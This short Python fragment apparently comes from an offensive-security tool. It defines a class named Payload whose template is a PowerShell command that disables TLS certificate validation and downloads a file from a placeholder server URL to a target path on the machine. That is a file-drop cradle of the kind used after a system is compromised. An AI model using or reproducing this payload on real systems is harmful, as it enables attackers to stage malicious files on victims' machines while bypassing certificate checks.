class Payload:
    template = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).DownloadFile('SERVERURL', 'TARGETPATH')"
